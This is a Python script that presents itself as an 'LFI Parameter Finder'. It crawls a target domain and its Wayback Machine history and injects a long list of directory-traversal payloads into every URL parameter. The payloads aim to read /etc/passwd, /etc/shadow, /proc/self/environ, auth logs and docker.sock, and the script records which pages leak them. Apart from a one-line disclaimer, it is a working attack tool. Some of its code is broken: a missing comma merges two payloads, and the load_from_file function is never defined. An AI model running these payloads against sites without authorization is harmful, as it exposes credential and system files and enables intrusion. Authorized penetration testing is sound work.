import requests
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from bs4 import BeautifulSoup
import tldextract
from concurrent.futures import ThreadPoolExecutor
import time
import os
import json

# üéØ Default LFI Payloads for testing
payloads = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "/etc/passwd",
    "../../../../../../../../etc/shadow",
    "../../../../../../../etc/shadow",
    "../../../../../../etc/shadow",
    "../../../../../etc/shadow",
    "../../../../etc/shadow",
    "../../../etc/shadow",
    "../../etc/shadow",
    "../etc/shadow",
    "/etc/shadow",
    "../../../../../../../../var/log/auth.log",
    "../../../../../windows/win.ini",
    "../../../../../../../../var/log/auth.log",
    "../../../../../windows/win.ini",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../../../usr/local/apache2/logs/error_log",
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../etc/issue",
    "../../../../../../../../opt/lampp/logs/access_log",
    "../../../../../../../../etc/group",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../etc/motd",
    "../../../../../../../../etc/shells",
    "../../../../../../../../etc/network/interfaces",
    "../../../../../../../../etc/crontab",
    "../../../../../../../../etc/apt/sources.list",
    "../../../../../../../../etc/hostname",
    "../../../../../../../../etc/resolv.conf",
    "../../../../../../../../etc/mail.rc",
    "../../../../../../../../etc/postfix/main.cf",
    "../../../../../../../../etc/aliases",
    "../../../../../../../../etc/exports",
    "../../../../../../../../etc/fstab",
    "../../../../../../../../etc/inittab",
    "../../../../../../../../etc/ld.so.conf",
    "../../../../../../../../etc/logrotate.conf",
    "../../../../../../../../etc/mtab",
    "../../../../../../../../etc/nsswitch.conf",
    "../../../../../../../../etc/opt/samba/smb.conf",
    "../../../../../../../../etc/profile",
    "../../../../../../../../etc/protocols",
    "../../../../../../../../etc/securetty",
    "../../../../../../../../etc/services",
    "../../../../../../../../etc/sysctl.conf",
    "../../../../../../../../etc/systemd/system.conf",
    "../../../../../../../../etc/timezone",
    "../../../../../../../../etc/vsftpd.conf",
    "../../../../../../../../usr/lib/python3/dist-packages/apt_pkg.so",
    "../../../../../../../../usr/share/common-licenses/GPL",
    "../../../../../../../../var/log/alternatives.log",
    "../../../../../../../../var/log/apport.log",
    "../../../../../../../../var/log/apt/history.log",
    "../../../../../../../../var/log/apt/term.log",
    "../../../../../../../../var/log/auth.log",
    "../../../../../../../../var/log/boot.log",
    "../../../../../../../../var/log/dpkg.log",
    "../../../../../../../../var/log/faillog",
    "../../../../../../../../var/log/kern.log",
    "../../../../../../../../var/log/lastlog",
    "../../../../../../../../var/log/syslog",
    "../../../../../../../../var/log/wtmp",
    "../../../../../../../../var/log/xferlog",
    "../../../../../../../../var/www/html/index.html",
    "../../../../../../../../proc/self/cmdline",
    "../../../../../../../../proc/self/status",
    "../../../../../../../../proc/version",
    "../../../../../../../../proc/net/arp",
    "../../../../../../../../proc/net/fib_trie",
    "../../../../../../../../proc/net/tcp",
    "../../../../../../../../proc/net/udp",
    "../../../../../../../../proc/net/unix",
    "../../../../../../../../proc/net/route",
    "../../../../../../../../proc/net/rt_cache",
    "../../../../../../../../proc/self/mounts",
    "../../../../../../../../var/run/utmp",
    "../../../../../../../../var/run/docker.sock"
    "/etc/passwd"
    
]

# üîÅ Visited URLs to avoid duplicates
visited_urls = set()
output_results = []

def is_subdomain(url, domain):
    """
    üïµÔ∏è‚Äç‚ôÇÔ∏è Check if a URL belongs to the same domain or its subdomains.
    """
    extracted_main = tldextract.extract(domain)
    extracted_url = tldextract.extract(url)
    return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix

def find_urls(url, domain):
    """
    üåê Crawl a given URL and return a list of internal links.
    """
    urls = []
    try:
        headers = {"User-Agent": "Mozilla/5.0 (LFI Scanner)"}
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if is_subdomain(full_url, domain) and full_url not in visited_urls:
                visited_urls.add(full_url)
                urls.append(full_url)
                time.sleep(1)  # Introduce delay
    except Exception as e:
        print(f"‚ùå Error crawling {url}: {e}")
    return urls

def get_wayback_urls(domain):
    """
    üåê Retrieve historical URLs for a domain using the Wayback Machine.
    """
    wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&collapse=urlkey"
    urls = []
    try:
        print(f"üîç Fetching Wayback URLs for {domain}...")
        response = requests.get(wayback_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            urls = [entry[1] for entry in data[1:]]  # Skip the header row
            print(f"‚úÖ Found {len(urls)} Wayback URLs for {domain}")
        else:
            print(f"‚ùå Failed to fetch Wayback URLs: HTTP {response.status_code}")
    except Exception as e:
        print(f"‚ùå Error fetching Wayback URLs: {e}")
    return urls

def test_lfi(url):
    """
    üß™ Test LFI payloads on all parameters of a URL.
    """
    try:
        parsed_url = urlparse(url)
        params = dict(parse_qs(parsed_url.query))
        headers = {"User-Agent": "Mozilla/5.0 (LFI Scanner)"}

        for param in params:
            for payload in payloads:
                # üöÄ Inject payload into the parameter
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"

                print(f"üîç Testing: {test_url}")
                response = requests.get(test_url, headers=headers, timeout=5)

                # üîé Check if payload reflects in the response
                if any(indicator in response.text.lower() for indicator in ["root:", "[boot loader]", "[extensions]", "[default]"]):
                    result = {"url": test_url, "parameter": param, "status": "vulnerable"}
                    print(f"‚úÖ [VULNERABLE] {result}")
                    output_results.append(result)
                    return True
        result = {"url": url, "status": "safe"}
        print(f"üõ°Ô∏è [SAFE] {result}")
        output_results.append(result)
    except Exception as e:
        error_message = {"url": url, "error": str(e)}
        print(f"‚ùå Error: {error_message}")
        output_results.append(error_message)
    return False

def crawl_and_test(urls, output_file="lfi_results.json", max_depth=3):
    """
    üîç Crawl a list of URLs and their subdomains to find potential LFI vulnerabilities.
    """
    for url in urls:
        print(f"üöÄ Starting crawl on URL: {url}")
        urls_to_test = [url]
        depth = 0

        domain = urlparse(url).netloc

        # ThreadPoolExecutor for parallel URL testing
        with ThreadPoolExecutor(max_workers=10) as executor:
            while urls_to_test and depth < max_depth:
                current_urls = urls_to_test[:10]  # Limit to first 10 URLs at each depth
                urls_to_test = urls_to_test[10:]

                # Crawl URLs and test them in parallel
                futures = [executor.submit(find_urls, url, domain) for url in current_urls]
                for future in futures:
                    urls = future.result()
                    urls_to_test.extend(urls)

                # Test the URLs for LFI vulnerabilities
                futures = [executor.submit(test_lfi, url) for url in current_urls]
                for future in futures:
                    future.result()  # Wait for the result

                depth += 1

    # Save results to the output file in JSON format
    with open(output_file, 'w') as f:
        json.dump(output_results, f, indent=4)
    print(f"\nüìÅ Results saved to: {output_file}")

if __name__ == "__main__":
    print("üåü Welcome to LFI Parameter Finder üåü")
    print("üîë Example Input: https://example.com")
    print("‚ö†Ô∏è Disclaimer: Use this tool only for educational purposes and authorized testing!")

    urls_option = input("üìÇ Do you want to load URLs from a .txt file? (y/n): ").lower()
    if urls_option == 'y':
        urls_file_path = input("üìÇ Enter the path to the .txt file containing URLs: ")
        urls = load_from_file(urls_file_path)
    else:
        target_url = input("üîó Enter the target URL (e.g., https://example.com): ")
        urls = [target_url]

    output_file = input("üìÇ Enter the name of the output file (leave blank for default 'lfi_results.json'): ").strip()
    output_file = output_file if output_file else "lfi_results.json"

    # Retrieve Wayback URLs and add them to the crawl list
    wayback_urls = get_wayback_urls(urls[0])
    urls.extend(wayback_urls)

    if urls:
        crawl_and_test(urls, output_file)
    else:
        print("‚ùå Error: Please provide valid URLs.")
